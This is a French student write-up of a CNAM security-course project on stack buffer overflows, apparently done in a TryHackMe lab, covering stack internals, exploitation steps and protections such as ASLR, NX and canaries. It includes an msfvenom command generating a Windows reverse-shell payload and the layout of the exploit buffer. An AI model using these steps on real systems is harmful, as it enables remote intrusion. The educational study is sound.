Stack Overflow

Analyse des vulnérabilités de type buffer overflow, démonstration pratique d'exploitation et étude des mécanismes de protection modernes. Module RSX112 · CNAM Paris.

// contexte

Dans le cadre du module RSX112 – Sécurité des systèmes au CNAM, j'ai réalisé un projet combinant analyse théorique et démonstration pratique des vulnérabilités de type stack overflow. L'objectif était double : comprendre le fonctionnement interne de la pile mémoire, et analyser comment ces vulnérabilités permettent de détourner le flux d'exécution d'un programme.

La démonstration pratique a été réalisée à partir de la room Buffer Overflow Prep sur TryHackMe, qui fournit un environnement contrôlé reproduisant une application vulnérable réaliste.

// fonctionnement de la pile mémoire

Les programmes utilisent plusieurs zones mémoire distinctes : heap (allocation dynamique), stack (appels de fonctions), segments de code et de données. La pile est la surface d'attaque ciblée dans ce type de vulnérabilité.

À chaque appel de fonction, un stack frame est créé contenant : les arguments, les variables locales, les registres sauvegardés et — point critique — l'adresse de retour. Quand la fonction se termine, l'instruction RET charge cette adresse pour reprendre l'exécution. C'est précisément cette adresse qu'un attaquant cherche à écraser.

// la vulnérabilité

Un stack overflow se produit lorsqu'un programme écrit plus de données dans un buffer que la taille mémoire prévue, sans vérification des bornes. Les données excédentaires écrasent les zones adjacentes dans la pile, dont l'adresse de retour. L'attaquant peut alors rediriger l'exécution vers un shellcode qu'il a préalablement injecté.

Si l'exploitation réussit, les conséquences vont de l'exécution de code arbitraire à la compromission complète du système avec élévation de privilèges.

// étapes d'exploitation

  • Identification de l'offset — injection d'un pattern unique (ex: Metasploit pattern_create), analyse du crash pour déterminer le nombre exact d'octets avant l'adresse de retour
  • Contrôle de EIP — vérification qu'on contrôle bien le registre pointeur d'instruction
  • Recherche de bad chars — identification des caractères filtrés par l'application
  • Injection du shellcode — génération avec msfvenom, placement dans le buffer
  • Écrasement de l'adresse de retour — redirection vers le shellcode via une instruction JMP ESP
# Génération du pattern pour trouver l'offset /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000 # Génération du shellcode (sans bad chars) msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -b "\x00" -f python # Structure de l'exploit final payload = b"A" * offset + JMP_ESP + b"\x90" * 16 + shellcode

// mécanismes de protection modernes

Une partie importante du projet portait sur l'étude des protections développées pour contrer ces attaques :

  • NX / XD Bit — marque la pile comme non-exécutable, empêchant l'exécution directe de shellcode. Contournable via ROP (Return-Oriented Programming)
  • ASLR — randomise les adresses mémoire (stack, heap, bibliothèques) à chaque exécution, rendant imprévisible la localisation du shellcode. Limites : fuites d'adresses, bruteforce sur 32 bits
  • Stack Canaries — valeur sentinelle placée entre variables locales et adresse de retour, vérifiée avant chaque retour de fonction. Très efficace contre les débordements simples
  • SafeSEH — protection Windows sur les gestionnaires d'exceptions structurées (SEH), empêchant leur manipulation pour détourner l'exécution
  • PaX / Grsecurity — extensions noyau Linux renforçant ASLR, restreignant l'exécution mémoire et limitant les attaques ROP

// ce que j'ai appris

  • Fonctionnement interne de la pile et des stack frames au niveau assembleur
  • Méthodologie complète d'exploitation d'un buffer overflow
  • Utilisation de GDB, Immunity Debugger et msfvenom
  • Analyse et contournement des mécanismes de protection modernes
  • Approche de hardening système pour limiter la surface d'attaque
  • Base solide pour l'exploit development et le reverse engineering
